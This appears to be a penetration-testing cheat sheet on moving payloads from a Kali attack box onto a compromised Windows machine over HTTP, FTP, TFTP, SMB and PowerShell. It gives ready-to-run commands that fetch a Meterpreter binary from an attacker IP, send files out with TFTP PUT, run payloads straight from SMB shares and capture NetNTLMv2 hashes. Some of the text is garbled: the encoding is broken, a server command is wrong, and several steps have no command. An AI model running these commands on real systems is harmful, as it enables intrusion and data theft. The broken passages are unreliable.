# Transfiriendo datos (traducir)

## Transfiriendo datos (traducir)

Often times on an engagement I find myself needing to copy a tool or a payload from my Kali linux attack box to a compromised Windows machine.

I’m putting this post together as a “cheat sheet” of sorts for my favorite ways to transfer files.

For purposes of demonstration, the file I’ll be copying over using all these methods is called met8888.exe and is located in /root/shells.

### HTTP

Downloading files via HTTP is pretty straightforward if you have access to the desktop and can open up a web browser, but it’s also possible to do it through the command line as well.

#### **Starting the Server**

**APACHE**

The two ways I usually serve a file over HTTP from Kali are either through Apache or through a Python HTTP server.

To serve a file up over Apache, just simply copy it to /var/www/html and enable the Apache service. Apache is installed by default in Kali:

`cp met8888.exe /var/www/html`  \
`service apache2 start`

**PYTHON**

The other option is to just start a Python webserver directly inside the shells directory. This only requires a single line of Python thanks to Pythonâ€™s SimpleHTTPServer module:

\`python -m simplehttpserver

## or

python http.server\`

#### **Downloading the files**

If you have desktop access, simply browse to `http://YOUR-KALI-IP/shell8888.exe` and use the browser to download the file.

If you only have command line access (e.g. through a shell), downloading via HTTP is a little trickier as there’s no built-in Windows equivalent to `curl` or `wget`. The best option is to use PowerShell’s WebClient object:

`Powershell (new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')`

### FTP

Another option to transfer files is FTP. Windows has a built in FTP client at `C:\Windows\System32\ftp.exe` so this option should almost always work.

#### **Starting the Server**

You can [definitely](https://hackerkitty.wordpress.com/2014/10/24/install-ftp-server-on-kali-linux/) [install](http://www.gosecure.it/blog/art/93/note/install-ftp-server-on-kali-linux/) a full-featured FTP server like `vsftpd` in Kali, but I find that’s often overkill. I just want a simple, temporary FTP server that I can spin up and down to share files. The best way to do this is with Python

**Python**

The `pytftpd` library, like the HTTP one above, lets you spin up a Python FTP server in one line. It doesn’t come installed by default, but you can install it with apt:

sudo apt install python-pyftpdlib

Now from the directory you want to serve, just run the Python module. With no arguments it runs on port `2121` and accepts anonymous authentication. To listen on the standard port:

One benefit of using FTP over HTTP is the ability to transfer files both way. If you want to grant the anonymous user write access, add the `-w` flag as well.

#### **Downloading the files**

As mentioned earlier, Windows has an FTP client built in to the PATH. You can open an FTP connection and download the files directly from Kali on the command line. Authenticate with user `anonymous` and any password

```
ftp 10.10.14.160
anonymous #user asked
(en blanco) #password asked

binary #to set type to binary
get binario.exe #to receibe binary

bye
```

Now this is great if you have an interactive shell where you can actually drop into the FTP prompt and issue commands, but it’s not that useful if you just have command injection and can only issue one command at a time.\
Fortunately, windows FTP can take a “script” of commands directly from the command line. Which means if we have a text file on the system that contains this:

```
#script for ftp
open 10.9.122.8
anonymous
whatever
binary
get met8888.exe
bye
#Then run
ftp -s:ftp_commands.txt
```

How to get that text file? We can echo into it one line at at time:

C:\Users\jarrieta\Desktop>echo open 10.9.122.8>ftp\_commands.txt\
C:\Users\jarrieta\Desktop>echo anonymous>>ftp\_commands.txt\
C:\Users\jarrieta\Desktop>echo whatever>>ftp\_commands.txt\
C:\Users\jarrieta\Desktop>echo binary>>ftp\_commands.txt\
C:\Users\jarrieta\Desktop>echo get met8888.exe>>ftp\_commands.txt\
C:\Users\jarrieta\Desktop>echo bye>>ftp\_commands.txt\
C:\Users\jarrieta\Desktop>ftp -s:ftp\_commands.txt

or in oneliner.

### TFTP

Trivial file transfer protocol is another possiblity if `tftp` is installed on the system. It used to be installed by default in Windows XP, but now needs to be manually enabled on newer versions of Windows. If the Windows machine you have access to happens to have the `tftp` client installed, however, it can make a really convenient way to grab files in a single command.

#### **Starting the Server**

Kali comes with a TFTP server installed, `atftpd`, which can be started with a simple `service atftpd start`. I’ve always had a hell of a time getting it configured and working though, and I rarely need to start and keep running a TFTP server as a service, so I just use the simpler Metasploit module.

#### **Downloading the Files**

Again, assuming the `tftp` utility is installed, you can grab a file with one line from the Windows prompt. It doesn't require any authentication. Just simply use the `-i` flag and the `GET` action.

`tftp -i ATTACKER_IP GET met8888.exe`

Exfiltrating files via TFTP is simple as well with the `PUT` action.

`tftp -i ATTACKER_IP PUT passwords.exe`

TFTP is a convenient, simple way to transfer files as it doesnâ€™t require authentication and you can do everything in a single command.

**Sidenote: Installing TFTP**

As I mentioned, TFTP is not included by default on newer versions of Windows. If you really wanted to, you can actually enable TFTP from the command line:

Might come in handy, but I’d always rather “live off the land” and use tools that are already available.

### SMB

This is actually my favorite method to transfer a file to a Windows host. SMB is built in to Windows and doesn’t require any special commands as Windows understands UNC paths. You can simply use the standard `copy` and `move` commands and SMB handles the file transferring automatically for you. What’s even better is Windows will actually let you _execute files_ via UNC paths, meaning you can download and execute a payload in one command!

#### Setting up the Server

Trying to get Samba set up and configured properly on Linux is a pain. You have to configure authentication, permissions, etc and it’s quite frankly way overkill if I just want to download one file. Now Samba an actually do some [really](http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html) [cool](http://passing-the-hash.blogspot.com/2016/06/im-pkdc-your-personal-kerberos-domain.html) stuff when you configure it to play nicely with Windows AD, but most of the time I just want a super simple server up and running that accepts any authentication and serves up or accepts files.

Enter `smbserver.py`, part of the [Impacket](https://github.com/CoreSecurity/impacket) project. Maybe one day I’ll write a blogpost without mentioning Impacket, but that day is not today.\
To launch a simple SMB server on port 445, just specify a share name and the path you want to share:

```
#Older versions of Parrot
python smbserver.py -smb2support ROPNOP /root/shells

#Newer versions of Parrot
impacket-smbserver ROPNOP /root/shells
```

The python script takes care of all the configurations for you, binds to 445, and accepts any authentication. It will even print out the hashed challenge responses for any system that connects to it.

In one line we’ve got an SMB share up and running. You can confirm it with `smbclient` from Linux or net view in Windows

#### Copying the Files

Since Windows handles UNC paths, you can just treat the `ROPNOP` share as if it's just a local folder from Windows. Basic Windows file commands like `dir`, `copy`, `move`, etc all just work:

`dir \\ATTACKER_IP\root\shells`  \
`copy \\ATTACKER_IP\root\shells\met8888.exe`

If you look at the output from `smbserver.py`, you can see that every time we access the share it outputs the NetNTLMv2 hash from the current Windows user. You can feed these into John or Hashcat and crack them if you want (assuming you canâ€™t just elevate to System and get them from Mimikatz)

#### **Executing files from SMB**

Because of the way Windows treats UNC paths, it's possible to just execute our binary directly from the SMB share without even needing to copy it over first. Just run the executable as if it were already local and the payload will fire:

This proved incredibly useful during another ColdFusion exploit I came across. After gaining access to an unprotected ColdFusion admin panel, I was able to configure a “system probe” to fire when a test failed. It let me execute a program as a failure action, and I just used a UNC path to execute a Meterpreter payload hosted from my Kali machine.

### DOWNLOAD DATA W/ POWERSHELL

Perhaps the greatest strength of PowerShell is it's foundation on the .NET framework. The .NET framework enables almost unlimited possibilites inside the scripting realm. This blessing can equally be a curse as things can get complicated. Fast.

This post will describe three methods for downloading files using PowerShell - weighed up with their pros and cons.

#### **1. Invoke-WebRequest**

The first and most obvious option is the Invoke-WebRequest cmdlet. It is built into PowerShell and can be used in the following method:

`IEX(Invoke-WebRequest -Uri $url -OutFile $output)`

**Pros**

With the cmdlet already available it is super easy to get started and use. Integration with Write-Progress is handy while watching paint dry scripts run (assuming you know the total file size). Cookies can also be persisted between mutiple requests through the use of the **-Session** and **-WebSession** parameters.

**Cons**

Speed. This cmdlet is slow. From what I have observed, the HTTP response stream is buffered into memory. Once the file has been fully loaded, it is flushed to disk. This adds a huge performance hit and potential memory issues for large files.

Another potentially serious con for this method is the reliance on Internet Explorer. For example, this cmdlet cannot be used on Windows Server Core edition servers as the Internet Explorer binaries are not included by default. In some cases you can use the **-UseBasicParsing** parameter, but it does not work in all cases.

#### **2. System.Net.WebClient**

A common .NET class used for downloading files is the [System.Net.WebClient](https://msdn.microsoft.com/en-us/library/system.net.webclient.aspx) class.

`IEX(New-Object System.Net.WebClient).DownloadFile($url, $output)`

**Pros**

This method is also easy to use. Not as syntactically nice as Invoke-RestMethod - yet can still be executed on a single line. Speed is great as the HTTP response stream is buffered to disk throughout the download process.

There is also the option of **System.Net.WebClient.DownloadFileAsync()**. This can be very handy if you'd like your script to continue while the file downloads in parallel.

**Cons**

There is no visible progress indicator (or any way to query the progress mid transfer). It essentially blocks the thread until the download completes or fails. This isn't a major con, however sometimes it is handy to know how far through the transfer you are.

#### **3. Start-BitsTransfer**

If you haven't heard of BITS before, [check this out](https://msdn.microsoft.com/en-us/library/aa362708.aspx). BITS is primarily designed for asynchronous file downloads, but works perfectly fine synchronously too (assuming you have BITS enabled).

`Import-Module BitsTransfer`  \
`IEX(Start-BitsTransfer -Source $url -Destination $output)`

**Pros**

This method proved to be the fastest in my test cases! Extensive integration with Write-Progress gives you a clear indicator of the file size and progress. The **-Asynchronous** flag can be used to queue transfers asychronously. This method is also incredibly flexible supporting separate credentials for the destination server AND web proxy, if required.

Personally, the biggest benefit to using the Start-BitsTransfer method is the ability to set retry actions on failure and limiting the amount of bandwidth available to a transfer.

**Cons**

While BITS is enabled by default on many machines, you can't guarantee it is enabled on all (unless you are actively managing this). Also with the way BITS is designed, if other BITS jobs are running in the background, your job could be queued or run at a later time hindering the execution of your script.
